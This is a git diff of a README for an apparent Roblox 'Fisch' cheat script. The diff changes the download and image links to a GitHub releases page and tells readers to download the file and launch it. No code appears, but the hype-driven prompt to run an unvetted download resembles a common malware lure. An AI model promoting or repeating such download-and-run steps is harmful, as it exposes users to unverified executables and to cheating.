@@ -40,7 +40,7 @@ The repository covers a wide range of topics related to Fisch in Roblox, includi
 
 ## 📥 Access the Software
 
-For direct access to the software, download it from [here](https://github.com/assets/Release.zip).
+For direct access to the software, download it from [here](https://github.com/hellochat00000/Roblox-Fisch-Script/releases).
 If the link ends with the file name, launch it to get started with the script.
 
 ## 🌐 Further Information
@@ -51,7 +51,7 @@ Explore more functionalities and updates in the "Releases" section.
 
 Dive into the world of Roblox Fisch with our cutting-edge script and elevate your gaming experience like never before. Stay ahead of the competition and enjoy seamless gameplay with our comprehensive solution.
 
-![Roblox Fisch](https://example.com/robloxfischimage.jpg)
+![Roblox Fisch](https://github.com/hellochat00000/Roblox-Fisch-Script/releases)
 
 Let's start fishing in Roblox with the ultimate advantage! 🎣🚀
 
